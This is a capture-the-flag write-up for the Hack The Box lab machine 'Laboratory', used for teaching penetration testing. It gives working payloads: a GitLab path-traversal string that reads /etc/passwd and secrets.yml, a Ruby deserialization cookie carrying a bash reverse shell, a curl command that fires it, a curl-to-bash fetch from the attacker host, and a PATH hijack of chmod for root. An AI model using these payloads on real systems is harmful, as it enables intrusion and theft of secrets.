## Recon
### Nmap
```bash
$ sudo nmap -sC -sV -oA nmap/initial 10.10.10.216
Starting Nmap 7.80 ( https://nmap.org ) at 2021-04-25 15:47 +07
Nmap scan report for 10.10.10.216
Host is up (0.036s latency).
Not shown: 997 filtered ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to https://laboratory.htb/
443/tcp open  ssl/http Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: The Laboratory
| ssl-cert: Subject: commonName=laboratory.htb
| Subject Alternative Name: DNS:git.laboratory.htb
| Not valid before: 2020-07-05T10:39:28
|_Not valid after:  2024-03-03T10:39:28
| tls-alpn: 
|_  http/1.1
Service Info: Host: laboratory.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.29 seconds

```

So we should add `laboratory.htb` to our host file

***Important***
```
OpenSSH 8.2p1 Ubuntu 4ubuntu0.1
ssl-cert: Subject: commonName=laboratory.htb
Subject Alternative Name: DNS:git.laboratory.htb
```
### HTTP
this is probably a static website
#### Laboratory.htb

![](Screen-shot/Pasted%20image%2020210425164440.png)

#### User
- Dexter, the CEO

### Gitlab
Get the gitlab subdomain `gitlab.laboratory.htb` from the certificate, add it to the host file
![](Screen-shot/certificate%20http.png)

![](Screen-shot/Gitlab%20login%20page.png)
 
Have to register with the `laboratory.htb` domain

![](Screen-shot/Not%20authorized%20domain%20when%20register.png)

#### Version 12.8.1
release date: Feb 24, 2020

![](Screen-shot/Gitlab%20version.png)

This is a vulnerable version


## Exploit -  Gaining foot hold:
### References:
- https://hackerone.com/reports/827052

We have an arbitrary file read by moving an issue (with the payload in the description) from one project to another.

This can be turned into a RCE by reading the secret key, and then use a deserialize attack on the cookie.

- Create two projects
- Add an issue with the following description:
`!\[a\](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd)`

- Move the issue to a different project
- The file will have been copied to that project


![](Screen-shot/2%20projects.png)

![](Screen-shot/Create%20passwd%20issue.png)

![](Screen-shot/Move%20issues.png)

![](Screen-shot/Download%20passwd%20file.png)

and we now have the `/etc/passwd` file
```txt
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
git:x:998:998::/var/opt/gitlab:/bin/sh
gitlab-www:x:999:999::/var/opt/gitlab/nginx:/bin/false
gitlab-redis:x:997:997::/var/opt/gitlab/redis:/bin/false
gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh
mattermost:x:994:994::/var/opt/gitlab/mattermost:/bin/sh
registry:x:993:993::/var/opt/gitlab/registry:/bin/sh
gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh
gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh
```


next, we want to grab the `secret_key_base` file

![](Screen-shot/PAYLOAD%20LFI%20secret.png)

![](Screen-shot/Move%20issues.png)

![](Screen-shot/download%20secret%20key.png)

### Our secret key base
`!\[a\](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml)`


```
3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3
```


![](Screen-shot/get%20secret%20key.png)

Next, we would need to host our own gitlab instance in order to achieve the deserialization attack

Pull the same gitlab version image from docker hub and then run the container
```bash
$ sudo docker pull gitlab/gitlab-ce:12.8.1-ce.0
```

Get into the container, edit the `/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml` file and then replace the `secret_key_base` with the one we grab from the `laboratory` server
Then run `sudo gitlab-ctl restart` to reload our settings

After that, start a rails-console from the container
```bash
gitlab-rails console
```
then paste our reverse shell payload

### Deserialize Payload
Add our reverse shell to the payload
```ruby
request = ActionDispatch::Request.new(Rails.application.env_config)
request.env["action_dispatch.cookies_serializer"] = :marshal
cookies = request.cookie_jar

erb = ERB.new("<%= `bash -c 'bash -i >& /dev/tcp/10.10.14.35/9001 0>&1'` %>")
depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
cookies.signed[:cookie] = depr
puts cookies[:cookie]
```

### Cookie for our reverse shell
`BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kidSNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjM1LzkwMDEgMD4mMSdgICkudG9fcyk7IF9lcmJvdXQGOgZFRjoOQGVuY29kaW5nSXU6DUVuY29kaW5nClVURi04BjsKRjoTQGZyb3plbl9zdHJpbmcwOg5AZmlsZW5hbWUwOgxAbGluZW5vaQA6DEBtZXRob2Q6C3Jlc3VsdDoJQHZhckkiDEByZXN1bHQGOwpUOhBAZGVwcmVjYXRvckl1Oh9BY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbgAGOwpU--24a3be3f3e19c27f7f7fa84007776210173da8dc`



### Use this cookie to invoke the server to connect back to our shell
replace our cookie to the `experimentation_subject_id` parameter

```bash
curl -vvv -k 'https://git.laboratory.htb/users/sign_in' -b "experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kidSNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjM1LzkwMDEgMD4mMSdgICkudG9fcyk7IF9lcmJvdXQGOgZFRjoOQGVuY29kaW5nSXU6DUVuY29kaW5nClVURi04BjsKRjoTQGZyb3plbl9zdHJpbmcwOg5AZmlsZW5hbWUwOgxAbGluZW5vaQA6DEBtZXRob2Q6C3Jlc3VsdDoJQHZhckkiDEByZXN1bHQGOwpUOhBAZGVwcmVjYXRvckl1Oh9BY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbgAGOwpU--24a3be3f3e19c27f7f7fa84007776210173da8dc"
```

And we get the shell

![](Screen-shot/Get%20the%20reverse%20shell.png)

## Privesc
This is a docker container 
```bash
git@git:~/gitlab-rails/working$ ls -la /
ls -la /
total 88
drwxr-xr-x   1 root root 4096 Jul  2  2020 .
drwxr-xr-x   1 root root 4096 Jul  2  2020 ..
-rwxr-xr-x   1 root root    0 Jul  2  2020 .dockerenv
-rw-r--r--   1 root root  157 Feb 24  2020 RELEASE
drwxr-xr-x   2 root root 4096 Feb 24  2020 assets
drwxr-xr-x   1 root root 4096 Feb 24  2020 bin
drwxr-xr-x   2 root root 4096 Apr 12  2016 boot
drwxr-xr-x   5 root root  340 Apr 25 01:56 dev
drwxr-xr-x   1 root root 4096 Jul  2  2020 etc
drwxr-xr-x   2 root root 4096 Apr 12  2016 home
drwxr-xr-x   1 root root 4096 Sep 13  2015 lib
drwxr-xr-x   2 root root 4096 Feb 12  2020 lib64
drwxr-xr-x   2 root root 4096 Feb 12  2020 media
drwxr-xr-x   2 root root 4096 Feb 12  2020 mnt
drwxr-xr-x   1 root root 4096 Feb 24  2020 opt
dr-xr-xr-x 328 root root    0 Apr 25 01:56 proc
drwx------   1 root root 4096 Jul 17  2020 root
drwxr-xr-x   1 root root 4096 Apr 25 01:56 run
drwxr-xr-x   1 root root 4096 Feb 21  2020 sbin
drwxr-xr-x   2 root root 4096 Feb 12  2020 srv
dr-xr-xr-x  13 root root    0 Apr 25 01:56 sys
drwxrwxrwt   1 root root 4096 Apr 25 08:47 tmp
drwxr-xr-x   1 root root 4096 Feb 12  2020 usr
drwxr-xr-x   1 root root 4096 Feb 12  2020 var

```

We use `deepce` [script](https://github.com/stealthcopter/deepce) to enumerate the docker container

```bash
curl http://10.10.14.35:9002/deepce.sh | bash
```
but nothing interesting shown up

We should try to manually enumerate the gitlab application.
Since we are literally the owner of the gitlab process, we can make an admin user, and enumerate the git server from that.

Open the console from inside the container
```bash
gitlab-rails console
```

### Switch our account into admin privilege
From the console
```ruby
u = User.find_by_username('wayne')
u.admin = true
u.save
```

![](Screen-shot/Get%20admin%20on%20gitlab.png)

Examine `dexter` repository, we find his ssh key

![](Screen-shot/Dexter%20ssh%20key.png)

And we got the shell on the machine itself

![](Screen-shot/SSH%20as%20dexter.png)

Look at the SUID binaries

![](Screen-shot/SUID%20docker-security.png)

The binary is owned by `dexter` and we can execute it as `root` 

### ltrace
```bash
dexter@laboratory:~$ ltrace /usr/local/bin/docker-security
setuid(0)                                                                                                            = -1
setgid(0)                                                                                                            = -1
system("chmod 700 /usr/bin/docker"chmod: changing permissions of '/usr/bin/docker': Operation not permitted
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                               = 256
system("chmod 660 /var/run/docker.sock"chmod: changing permissions of '/var/run/docker.sock': Operation not permitted
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                               = 256
+++ exited (status 0) +++
```

We see that once we are root, we can hijack the `chmod` binary since it doesn't use the absolute path

create a `chmod` executable which essentially starts a `bash` shell
```bash
#!/bin/bash
echo "chmod hijack"
bash -i
```

```bash
dexter@laboratory:/dev/shm$ vi chmod
dexter@laboratory:/dev/shm$ chmod +x chmod 
dexter@laboratory:/dev/shm$ export PATH=$(pwd):$PATH
dexter@laboratory:/dev/shm$ /usr/local/bin/docker-security
chmod hijack
root@laboratory:/dev/shm# cat chmod 

```

![](Screen-shot/Gain%20root.png)